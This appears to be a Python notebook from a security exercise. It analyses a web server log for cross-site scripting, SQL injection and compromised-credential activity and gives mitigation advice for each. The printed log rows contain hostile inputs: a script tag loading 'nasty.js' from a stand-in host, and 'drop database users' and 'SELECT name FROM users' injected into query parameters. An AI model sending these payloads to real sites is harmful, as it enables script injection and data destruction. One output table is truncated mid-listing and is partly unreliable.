# %%
import re
import pandas as pd
import urllib.parse
pd.set_option('display.max_colwidth', None)
pd.options.display.max_rows = 100

def url_decode(string):
    return urllib.parse.unquote(string)

data = pd.read_csv(
    'web_logs_2023-01-26.log',
    sep=r'\s(?=(?:[^"]*"[^"]*")*[^"]*$)(?![^\[]*\])',
    engine='python',
    na_values='-',
    header=None,
    names=['ip', 'identity', 'userid', 'unknown', 'time', 'request', 'response', 'size', 'referer', 'user_agent', 'unknown2'],
    converters={'request': url_decode}
)

# %% [markdown]
# ## 1. Cross-Site Scripting
#
# We see a number of what appear to be Cross-Site Scripting (XSS) attempts.
#
# Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application.
#
# The root cause of XSS vulnerability stems from the failure to properly validate or escape user input or dynamic content, allowing client-side JavaScript to be injected in a manner that will enable it to execute. Therefore, your application is at risk of XSS vulnerability wherever it handles user input. XSS comes in many different forms, which can be categorized into the following groups:
#
# * Reflected (non-persistent) XSS: Just as the name implies, reflected XSS occurs when the injected malicious script results show up or are immediately reflected by the user without adequately sanitizing the content.
#
# * Stored (persistent) XSS: This is a more devastating variant of a cross-site scripting flaw. It occurs when the data provided by the attacker is saved by the server and then permanently displayed on “normal” pages returned to other users in the course of regular browsing, without proper HTML escaping.
#
# * DOM-based XSS: DOM-based XSS occurs when the injected malicious code does not get to the webserver. Instead,  it is reflected by client-side JavaScript code on the client-side.
#
# ### Recommendation
#
# Preventing cross-site scripting is trivial in some cases but can be much harder depending on the complexity of the application and the ways it handles user-controllable data.
#
# In general, effectively preventing XSS vulnerabilities is likely to involve a combination of the following measures:
#
# * Filter input on arrival. At the point where user input is received, filter as strictly as possible based on what is expected or valid input.
#
# * Encode data on output. At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.
#
# * Use appropriate response headers. To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.
#
# * Content Security Policy. As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.
#
# ### References
#
# https://www.comparitech.com/net-admin/how-to-find-xss-vulnerability/

# %%
data[data.request.str.contains('.js', regex= True, na=False)][["ip","userid","request","response"]]
# Out:
#                   ip   userid  \
# 65      80.37.69.128  Theresa
# 120  201.138.110.200  Theresa
# 158     81.91.56.115  Theresa
# 205      1.243.92.78  Theresa
# 336  130.183.166.199  Theresa
# 341   63.144.139.231  Theresa
# 393    142.217.67.17  Theresa
# 517   223.195.119.35      NaN
# 552   204.210.110.56  Theresa
# 553     199.71.89.79  Theresa
# 637      40.80.114.9  Theresa
# 687  223.105.197.105  Theresa
# 906     40.56.241.89  Theresa
# 932    198.69.92.243  Theresa
# 951      8.157.47.77  Theresa
# 985   141.32.106.230  Theresa
#
#                                                                                                        request  \
# 65                         "PUT /cart?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 120       "POST /admin/remove_product?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 158        "DELETE /admin/remove_user?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 205                    "DELETE /login?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 336                 "DELETE /purchase?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 341                    "PUT /register?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 393                       "GET /admin?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 517  "GET ?data=<script src="http://www.badplace.com/nasty.js"></script%3/4037403083972567-254-05/29 HTTP/1.0"
# 552                 "DELETE /purchase?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 553             "POST /admin/add_user?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 637                 "DELETE /purchase?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 687                         "GET /api?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 906                   "POST /register?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 932                 "DELETE /purchase?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 951          "PUT /purchase/completed?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 985                    "DELETE /login?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
#
#      response
# 65        200
# 120       200
# 158       200
# 205       200
# 336       200
# 341       200
# 393       303
# 517       200
# 552       200
# 553       200
# 637       200
# 687       200
# 906       200
# 932       304
# 951       500
# 985       200

# %% [markdown]
# ## 2. SQL Injections
#
# We see a number of what appear to be SQL injection attempts.
#
# SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.
#
# In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.
#
# ### Recommendation
#
# Most instances of SQL injection can be prevented by using parameterized queries (also known as prepared statements) instead of string concatenation within the query.
#
# ### References
#
# https://portswigger.net/web-security/sql-injection
# https://portswigger.net/kb/issues/00400480_sql-statement-in-request-parameter

# %%
data[data.request.str.contains('drop', regex= True, na=False)][["ip","userid","request","response"]]
# Out:
#                   ip   userid  \
# 17     136.201.74.75  Theresa
# 43      207.77.8.212  Theresa
# 137   72.157.181.140  Theresa
# 144    201.79.34.146  Theresa
# 149   137.135.121.45  Theresa
# 187  123.230.181.187  Theresa
# 269      42.46.68.21  Theresa
# 474    36.105.48.234  Theresa
# 564     13.0.140.201  Theresa
# 617    89.196.253.13  Theresa
# 815   131.196.210.53  Theresa
#
#                                                           request  response
# 17      "PUT /purchase/completed?id=drop+database+users HTTP/1.0"       200
# 43                  "POST /admin?id=drop+database+users HTTP/1.0"       304
# 137            "DELETE /purchase?id=drop+database+users HTTP/1.0"       200
# 144      "GET /admin/remove_user?id=drop+database+users HTTP/1.0"       200
# 149               "GET /register?id=drop+database+users HTTP/1.0"       200
# 187              "POST /register?id=drop+database+users HTTP/1.0"       200
# 269                   "GET /cart?id=drop+database+users HTTP/1.0"       200
# 474               "DELETE /login?id=drop+database+users HTTP/1.0"       303
# 564   "DELETE /admin/remove_user?id=drop+database+users HTTP/1.0"       403
# 617                "DELETE /cart?id=drop+database+users HTTP/1.0"       200
# 815  "POST /admin/remove_product?id=drop+database+users HTTP/1.0"       200

# %%
data[data.request.str.contains('SELECT', regex= True, na=False)][["ip","userid","request","response"]]
# Out:
#                   ip   userid  \
# 21     151.203.93.88  Theresa
# 93   167.106.101.104  Theresa
# 110    115.76.49.102  Theresa
# 184    78.245.211.54  Theresa
# 197   148.75.121.166  Theresa
# 207    115.101.230.8  Theresa
# 216     203.2.14.111  Theresa
# 310  122.171.115.111  Theresa
# 468    198.131.5.220  Theresa
# 679    97.210.10.127  Theresa
# 770   95.194.243.179  Theresa
# 803       2.47.2.145  Theresa
# 877     9.251.25.139  Theresa
# 935     93.120.6.208  Theresa
#
#                                                             request  response
# 21            "DELETE /register?id=SELECT+name+FROM+users HTTP/1.0"       200
# 93              "POST /purchase?id=SELECT+name+FROM+users HTTP/1.0"       200
# 110  "DELETE /admin/remove_user?id=SELECT+name+FROM+users HTTP/1.0"       200
# 184        "PUT /admin/add_user?id=SELECT+name+FROM+users HTTP/1.0"       200
# 197    "POST /admin/add_product?id=SELECT+name+FROM+users HTTP/1.0"       303
# 207                  "PUT /cart?id=SELECT+name+FROM+users HTTP/1.0"       200
# 216    "POST /admin/add_product?id=SELECT+name+FROM+users HTTP/1.0"       200
# 310    "POST /admin/add_product?id=SELECT+name+FROM+users HTTP/1.0"       200
# 468              "GET /register?id=SELECT+name+FROM+users HTTP/1.0"       200
# 679             "POST /register?id=SELECT+name+FROM+users HTTP/1.0"       200
# 770           "DELETE /purchase?id=SELECT+name+FROM+users HTTP/1.0"       200
# 803           "DELETE /register?id=SELECT+name+FROM+users HTTP/1.0"       200
# 877                   "GET /api?id=SELECT+name+FROM+users HTTP/1.0"       200
# 935   "POST /purchase/completed?id=SELECT+name+FROM+users HTTP/1.0"       403

# %% [markdown]
# ## Compromised Credentials
#
# We can observe that (almost) all of the malicious requests are being made by Theresa. And we can also see that the client ips vary greatly suggesting Theresa's credentials have been compromised and are being actively used to attack the site.
#
# By looking at requests made against the `/login` endpoint, we can speculate that a brute-force login attack might have been made, as a number of `403`s were observed from multiple client ips - no other login attempts are made in the period in question from other users.
#
# ### Recommendation
#
# 1. Use stronger passwords
# 2. Limit number of login attempts
# 3. Use  CAPTCHAs
# 4. Enforce two-factor authentication
# 5. Monitor attempted logins
#
# ### References
#
# https://portswigger.net/web-security/access-control
# https://wishdesk.com/blog/guide-to-brute-force-attack

# %%
data[data.userid.str.contains('Theresa', regex= True, na=False)][["ip","userid","request","response"]]
# Out:
#                   ip   userid  \
# 2      62.21.196.194  Theresa
# 17     136.201.74.75  Theresa
# 21     151.203.93.88  Theresa
# 30      207.60.25.21  Theresa
# 31     32.219.87.143  Theresa
# 43      207.77.8.212  Theresa
# 44      47.51.127.36  Theresa
# 65      80.37.69.128  Theresa
# 70      10.147.83.64  Theresa
# 93   167.106.101.104  Theresa
# 110    115.76.49.102  Theresa
# 116   23.183.125.135  Theresa
# 118    185.118.67.48  Theresa
# 119   163.161.171.31  Theresa
# 120  201.138.110.200  Theresa
# 127    43.22.168.182  Theresa
# 136   67.179.115.126  Theresa
# 137   72.157.181.140  Theresa
# 144    201.79.34.146  Theresa
# 145    73.141.26.234  Theresa
# 149   137.135.121.45  Theresa
# 158     81.91.56.115  Theresa
# 184    78.245.211.54  Theresa
# 187  123.230.181.187  Theresa
# 197   148.75.121.166  Theresa
# 205      1.243.92.78  Theresa
# 207    115.101.230.8  Theresa
# 216     203.2.14.111  Theresa
# 238   161.211.50.230  Theresa
# 269      42.46.68.21  Theresa
# 286      7.2.229.168  Theresa
# 308  129.136.117.201  Theresa
# 310  122.171.115.111  Theresa
# 331     88.4.159.182  Theresa
# 336  130.183.166.199  Theresa
# 341   63.144.139.231  Theresa
# 342    82.151.245.78  Theresa
# 348     24.38.65.149  Theresa
# 361  220.171.155.120  Theresa
# 370     22.42.136.51  Theresa
# 373    198.236.2.135  Theresa
# 385   143.175.85.203  Theresa
# 391     67.0.218.151  Theresa
# 393    142.217.67.17  Theresa
# 401   99.244.103.210  Theresa
# 419   111.84.209.235  Theresa
# 434      79.48.94.17  Theresa
# 447  129.164.104.179  Theresa
# 449     104.27.33.72  Theresa
# 458   36.166.174.213  Theresa
# 461  133.223.204.106  Theresa
# 468    198.131.5.220  Theresa
# 474    36.105.48.234  Theresa
# 486  207.137.169.152  Theresa
# 489   159.193.134.84  Theresa
# 496     38.231.15.94  Theresa
# 509    52.133.16.123  Theresa
# 525   45.220.122.197  Theresa
# 537     54.161.99.81  Theresa
# 552   204.210.110.56  Theresa
# 553     199.71.89.79  Theresa
# 562   113.247.31.170  Theresa
# 564     13.0.140.201  Theresa
# 573    20.93.153.227  Theresa
# 606  148.244.210.164  Theresa
# 617    89.196.253.13  Theresa
# 637      40.80.114.9  Theresa
# 641     94.86.96.133  Theresa
# 645   108.166.186.94  Theresa
# 663  145.126.241.128  Theresa
# 672   107.215.150.15  Theresa
# 679    97.210.10.127  Theresa
# 687  223.105.197.105  Theresa
# 702     54.78.89.111  Theresa
# 716   16.105.217.219  Theresa
# 739   211.159.238.16  Theresa
# 745     15.98.75.187  Theresa
# 770   95.194.243.179  Theresa
# 785     2.136.69.193  Theresa
# 798    67.68.148.127  Theresa
# 803       2.47.2.145  Theresa
# 815   131.196.210.53  Theresa
# 824    66.176.130.63  Theresa
# 841    40.30.215.148  Theresa
# 847  195.178.254.119  Theresa
# 852   43.190.237.150  Theresa
# 877     9.251.25.139  Theresa
# 885   117.155.191.71  Theresa
# 895     106.30.26.95  Theresa
# 900    111.71.12.203  Theresa
# 906     40.56.241.89  Theresa
# 912  135.245.177.229  Theresa
# 914   113.254.38.255  Theresa
# 917    48.16.255.222  Theresa
# 932    198.69.92.243  Theresa
# 935     93.120.6.208  Theresa
# 951      8.157.47.77  Theresa
# 985   141.32.106.230  Theresa
#
#                                                                                                   request  \
# 2                                                                                  "POST /admin HTTP/1.0"
# 17                                              "PUT /purchase/completed?id=drop+database+users HTTP/1.0"
# 21                                                  "DELETE /register?id=SELECT+name+FROM+users HTTP/1.0"
# 30                                                                         "PUT /admin/add_user HTTP/1.0"
# 31                                                                               "DELETE /admin HTTP/1.0"
# 43                                                          "POST /admin?id=drop+database+users HTTP/1.0"
# 44                                                                     "POST /admin/add_product HTTP/1.0"
# 65                    "PUT /cart?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 70                                                                                  "POST /cart HTTP/1.0"
# 93                                                    "POST /purchase?id=SELECT+name+FROM+users HTTP/1.0"
# 110                                        "DELETE /admin/remove_user?id=SELECT+name+FROM+users HTTP/1.0"
# 116                                                                  "GET /admin/remove_product HTTP/1.0"
# 118                                                                                 "PUT /login HTTP/1.0"
# 119                                                               "DELETE /admin/remove_product HTTP/1.0"
# 120  "POST /admin/remove_product?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 127                                                                              "DELETE /login HTTP/1.0"
# 136                                                                    "PUT /purchase/completed HTTP/1.0"
# 137                                                    "DELETE /purchase?id=drop+database+users HTTP/1.0"
# 144                                              "GET /admin/remove_user?id=drop+database+users HTTP/1.0"
# 145                                                                  "DELETE /admin/remove_user HTTP/1.0"
# 149                                                       "GET /register?id=drop+database+users HTTP/1.0"
# 158   "DELETE /admin/remove_user?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 184                                              "PUT /admin/add_user?id=SELECT+name+FROM+users HTTP/1.0"
# 187                                                      "POST /register?id=drop+database+users HTTP/1.0"
# 197                                          "POST /admin/add_product?id=SELECT+name+FROM+users HTTP/1.0"
# 205               "DELETE /login?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 207                                                        "PUT /cart?id=SELECT+name+FROM+users HTTP/1.0"
# 216                                          "POST /admin/add_product?id=SELECT+name+FROM+users HTTP/1.0"
# 238                                                                                   "PUT /api HTTP/1.0"
# 269                                                           "GET /cart?id=drop+database+users HTTP/1.0"
# 286                                                                  "PUT /admin/remove_product HTTP/1.0"
# 308                                                                                 "PUT /login HTTP/1.0"
# 310                                          "POST /admin/add_product?id=SELECT+name+FROM+users HTTP/1.0"
# 331                                                                           "DELETE /purchase HTTP/1.0"
# 336            "DELETE /purchase?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 341               "PUT /register?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 342                                                                 "POST /admin/remove_product HTTP/1.0"
# 348                                                                    "POST /admin/add_product HTTP/1.0"
# 361                                                                                 "GET /login HTTP/1.0"
# 370                                                                              "PUT /register HTTP/1.0"
# 373                                                                     "PUT /admin/remove_user HTTP/1.0"
# 385                                                                   "POST /purchase/completed HTTP/1.0"
# 391                                                                   "POST /purchase/completed HTTP/1.0"
# 393                  "GET /admin?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 401                                                                    "PUT /purchase/completed HTTP/1.0"
# 419                                                                           "DELETE /purchase HTTP/1.0"
# 434                                                                  "DELETE /admin/add_product HTTP/1.0"
# 447                                                                  "DELETE /admin/add_product HTTP/1.0"
# 449                                                                              "GET /register HTTP/1.0"
# 458                                                                       "POST /admin/add_user HTTP/1.0"
# 461                                                                     "GET /admin/add_product HTTP/1.0"
# 468                                                    "GET /register?id=SELECT+name+FROM+users HTTP/1.0"
# 474                                                       "DELETE /login?id=drop+database+users HTTP/1.0"
# 486                                                                              "DELETE /login HTTP/1.0"
# 489                                                                   "POST /purchase/completed HTTP/1.0"
# 496                                                                                 "GET /login HTTP/1.0"
# 509                                                                        "GET /admin/add_user HTTP/1.0"
# 525                                                                              "PUT /register HTTP/1.0"
# 537                                                                             "POST /register HTTP/1.0"
# 552            "DELETE /purchase?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 553        "POST /admin/add_user?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 562                                                                              "PUT /register HTTP/1.0"
# 564                                           "DELETE /admin/remove_user?id=drop+database+users HTTP/1.0"
# 573                                                                                 "GET /login HTTP/1.0"
# 606                                                                    "PUT /purchase/completed HTTP/1.0"
# 617                                                        "DELETE /cart?id=drop+database+users HTTP/1.0"
# 637            "DELETE /purchase?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 641                                                                                  "GET /cart HTTP/1.0"
# 645                                                                                 "POST /cart HTTP/1.0"
# 663                                                                                "POST /login HTTP/1.0"
# 672                                                                    "PUT /purchase/completed HTTP/1.0"
# 679                                                   "POST /register?id=SELECT+name+FROM+users HTTP/1.0"
# 687                    "GET /api?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 702                                                                    "POST /admin/remove_user HTTP/1.0"
# 716                                                                             "POST /purchase HTTP/1.0"
# 739                                                                                 "PUT /login HTTP/1.0"
# 745                                                                           "DELETE /purchase HTTP/1.0"
# 770                                                 "DELETE /purchase?id=SELECT+name+FROM+users HTTP/1.0"
# 785                                                                     "PUT /admin/remove_user HTTP/1.0"
# 798                                                                                 "PUT /admin HTTP/1.0"
# 803                                                 "DELETE /register?id=SELECT+name+FROM+users HTTP/1.0"
# 815                                          "POST /admin/remove_product?id=drop+database+users HTTP/1.0"
# 824                                                                             "POST /register HTTP/1.0"
# 841                                                                              "GET /register HTTP/1.0"
# 847                                                               "DELETE /admin/remove_product HTTP/1.0"
# 852                                                                              "DELETE /login HTTP/1.0"
# 877                                                         "GET /api?id=SELECT+name+FROM+users HTTP/1.0"
# 885                                                                                 "PUT /admin HTTP/1.0"
# 895                                                                     "GET /admin/add_product HTTP/1.0"
# 900                                                                     "PUT /admin/remove_user HTTP/1.0"
# 906              "POST /register?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 912                                                                                  "GET /cart HTTP/1.0"
# 914                                                                              "PUT /register HTTP/1.0"
# 917                                                                                 "GET /admin HTTP/1.0"
# 932            "DELETE /purchase?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 935                                         "POST /purchase/completed?id=SELECT+name+FROM+users HTTP/1.0"
# 951     "PUT /purchase/completed?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 985               "DELETE /login?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
#
#      response
# 2         200
# 17        200
# 21        200
# 30        200
# 31        403
# 43        304
# 44        200
# 65        200
# 70        200
# 93        200
# 110       200
# 116       200
# 118       200
# 119       502
# 120       200
# 127       403
# 136       200
# 137       200
# 144       200
# 145       200
# 149       200
# 158       200
# 184       200
# 187       200
# 197       303
# 205       200
# 207       200
# 216       200
# 238       200
# 269       200
# 286       404
# 308       200
# 310       200
# 331       500
# 336       200
# 341       200
# 342       504
# 348       200
# 361       200
# 370       404
# 373       200
# 385       200
# 391       502
# 393       303
# 401       200
# 419       200
# 434       200
# 447       200
# 449       200
# 458       200
# 461       200
# 468       200
# 474       303
# 486       504
# 489       404
# 496       504
# 509       200
# 525       500
# 537       304
# 552       200
# 553       200
# 562       200
# 564       403
# 573       403
# 606       404
# 617       200
# 637       200
# 641       200
# 645       404
# 663       200
# 672       200
# 679       200
# 687       200
# 702       504
# 716       200
# 739       200
# 745       200
# 770       200
# 785       200
# 798       200
# 803       200
# 815       200
# 824       200
# 841       200
# 847       200
# 852       200
# 877       200
# 885       502
# 895       200
# 900       500
# 906       200
# 912       304
# 914       200
# 917       200
# 932       304
# 935       403
# 951       500
# 985       200

# %%
df1 = data[data.request.str.contains('login', regex= True, na=False)][["ip","time","userid","request","response"]]
df1
# Out:
#                   ip                          time   userid  \
# 4      78.144.28.132  [2023-01-26 15:45:45 +00:00]      NaN
# 13      102.53.65.86  [2023-01-26 15:45:45 +00:00]      NaN
# 19     121.193.109.2  [2023-01-26 15:45:45 +00:00]      NaN
# 25    59.219.254.101  [2023-01-26 15:45:45 +00:00]      NaN
# 34     111.237.69.83  [2023-01-26 15:45:45 +00:00]      NaN
# 39     111.237.69.83  [2023-01-26 15:45:45 +00:00]      NaN
# 49    113.127.197.68  [2023-01-26 15:45:45 +00:00]      NaN
# 54    223.195.119.35  [2023-01-26 15:45:45 +00:00]      NaN
# 57     12.92.165.166  [2023-01-26 15:45:45 +00:00]      NaN
# 39                                                                  "DELETE /login HTTP/1.0"
# 49                                                                     "PUT /login HTTP/1.0"
# 54                                                                     "PUT /login HTTP/1.0"
# 57                                                                    "POST /login HTTP/1.0"
# 68                                                                     "PUT /login HTTP/1.0"
# 84                                                                    "POST /login HTTP/1.0"
# 87                                                                    "POST /login HTTP/1.0"
# 99                                                                     "GET /login HTTP/1.0"
# 112                                                                 "DELETE /login HTTP/1.0"
# 118                                                                    "PUT /login HTTP/1.0"
# 127                                                                 "DELETE /login HTTP/1.0"
# 129                                                                 "DELETE /login HTTP/1.0"
# 140                                                                   "POST /login HTTP/1.0"
# 160                                                                   "POST /login HTTP/1.0"
# 182                                                                   "POST /login HTTP/1.0"
# 183                                                                 "DELETE /login HTTP/1.0"
# 185                                                                 "DELETE /login HTTP/1.0"
# 199                                                                    "GET /login HTTP/1.0"
# 205  "DELETE /login?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
# 209                                                                    "GET /login HTTP/1.0"
# 222                                                                    "GET /login HTTP/1.0"
# 227                                                                    "PUT /login HTTP/1.0"
# 244                                                                    "PUT /login HTTP/1.0"
# 255                                                                 "DELETE /login HTTP/1.0"
# 275                                                                 "DELETE /login HTTP/1.0"
# 298                                                                 "DELETE /login HTTP/1.0"
# 305                                                                 "DELETE /login HTTP/1.0"
# 308                                                                    "PUT /login HTTP/1.0"
# 326                                                                   "POST /login HTTP/1.0"
# 361                                                                    "GET /login HTTP/1.0"
# 374                                                                   "POST /login HTTP/1.0"
# 394                                                                   "POST /login HTTP/1.0"
# 395                                                                 "DELETE /login HTTP/1.0"
# 416                                                                    "PUT /login HTTP/1.0"
# 438                                                                    "PUT /login HTTP/1.0"
# 445                                                                   "POST /login HTTP/1.0"
# 467                                                                 "DELETE /login HTTP/1.0"
# 472                                                                   "POST /login HTTP/1.0"
# 474                                          "DELETE /login?id=drop+database+users HTTP/1.0"
# 486                                                                 "DELETE /login HTTP/1.0"
# 495                                                                    "PUT /login HTTP/1.0"
# 496                                                                    "GET /login HTTP/1.0"
# 500                                                                    "GET /login HTTP/1.0"
# 508                                                                    "GET /login HTTP/1.0"
# 523                                                                    "PUT /login HTTP/1.0"
# 538                                                                   "POST /login HTTP/1.0"
# 540                                                                    "PUT /login HTTP/1.0"
# 573                                                                    "GET /login HTTP/1.0"
# 581                                                                 "DELETE /login HTTP/1.0"
# 595                                                                    "GET /login HTTP/1.0"
# 598                                                                    "GET /login HTTP/1.0"
# 604                                                                    "PUT /login HTTP/1.0"
# 655                                                                 "DELETE /login HTTP/1.0"
# 663                                                                   "POST /login HTTP/1.0"
# 666                                                                   "POST /login HTTP/1.0"
# 677                                                                    "PUT /login HTTP/1.0"
# 683                                                                    "GET /login HTTP/1.0"
# 685                                                                    "PUT /login HTTP/1.0"
# 693                                                                    "PUT /login HTTP/1.0"
# 696                                                                 "DELETE /login HTTP/1.0"
# 704                                                                    "GET /login HTTP/1.0"
# 725                                                                    "GET /login HTTP/1.0"
# 739                                                                    "PUT /login HTTP/1.0"
# 752                                                                 "DELETE /login HTTP/1.0"
# 765                                                                   "POST /login HTTP/1.0"
# 781                                                                   "POST /login HTTP/1.0"
# 787                                                                   "POST /login HTTP/1.0"
# 788                                                                    "GET /login HTTP/1.0"
# 791                                                                 "DELETE /login HTTP/1.0"
# 804                                                                    "GET /login HTTP/1.0"
# 805                                                                    "PUT /login HTTP/1.0"
# 818                                                                    "PUT /login HTTP/1.0"
# 829                                                                    "PUT /login HTTP/1.0"
# 832                                                                    "GET /login HTTP/1.0"
# 833                                                                    "GET /login HTTP/1.0"
# 839                                                                 "DELETE /login HTTP/1.0"
# 852                                                                 "DELETE /login HTTP/1.0"
# 876                                                                    "PUT /login HTTP/1.0"
# 892                                                                 "DELETE /login HTTP/1.0"
# 908                                                                    "GET /login HTTP/1.0"
# 925                                                                   "POST /login HTTP/1.0"
# 940                                                                 "DELETE /login HTTP/1.0"
# 953                                                                    "PUT /login HTTP/1.0"
# 956                                                                    "PUT /login HTTP/1.0"
# 957                                                                   "POST /login HTTP/1.0"
# 977                                                                   "POST /login HTTP/1.0"
# 983                                                                 "DELETE /login HTTP/1.0"
# 985  "DELETE /login?data=<script src="http://www.badplace.com/nasty.js"></script%3 HTTP/1.0"
#
#      response
# 4         200
# 13        200
# 19        200
# 25        200
# 34        200
# 39        200
# 49        200
# 54        200
# 57        200
# 68        200
# 84        200
# 87        200
# 99        303
# 112       200
# 118       200
# 127       403
# 129       200
# 140       200
# 160       404
# 182       500
# 183       200
# 185       200
# 199       404
# 205       200
# 209       500
# 222       200
# 227       502
# 244       200
# 255       200
# 275       200
# 298       200
# 305       200
# 308       200
# 326       200
# 361       200
# 374       200
# 394       200
# 395       200
# 416       200
# 438       404
# 445       304
# 467       502
# 472       403
# 474       303
# 486       504
# 495       200
# 496       504
# 500       304
# 508       200
# 523       200
# 538       200
# 540       200
# 573       403
# 581       200
# 595       502
# 598       200
# 604       200
# 655       200
# 663       200
# 666       403
# 677       304
# 683       200
# 685       200
# 693       200
# 696       200
# 704       304
# 725       200
# 739       200
# 752       504
# 765       303
# 781       504
# 787       304
# 788       200
# 791       502
# 804       200
# 805       500
# 818       200
# 829       404
# 832       200
# 833       200
# 839       403
# 852       200
# 876       304
# 892       200
# 908       200
# 925       200
# 940       304
# 953       200
# 956       200
# 957       200
# 977       404
# 983       200
# 985       200

# %%
df2 = df1[df1['response'] == 403]
df2
# Out:
#                  ip                          time   userid  \
# 127   43.22.168.182  [2023-01-26 15:45:45 +00:00]  Theresa
# 472   78.144.28.132  [2023-01-26 15:45:45 +00:00]      NaN
# 573   20.93.153.227  [2023-01-26 15:45:45 +00:00]  Theresa
# 666  223.195.119.35  [2023-01-26 15:45:45 +00:00]      NaN
# 839  223.195.119.35  [2023-01-26 15:45:45 +00:00]      NaN
#
#                       request  response
# 127  "DELETE /login HTTP/1.0"       403
# 472    "POST /login HTTP/1.0"       403
# 573     "GET /login HTTP/1.0"       403
# 666    "POST /login HTTP/1.0"       403
# 839  "DELETE /login HTTP/1.0"       403

# %% [markdown]
# ### HTTP Response Codes for Reference
#
# | Code | Description |
# |----------|---------|
# | 1xx | Information |
# | 2xx | Successful  |
# | 3xx | Redirection |
# | 4xx | Client Error|
# | 5xx | Server Error|
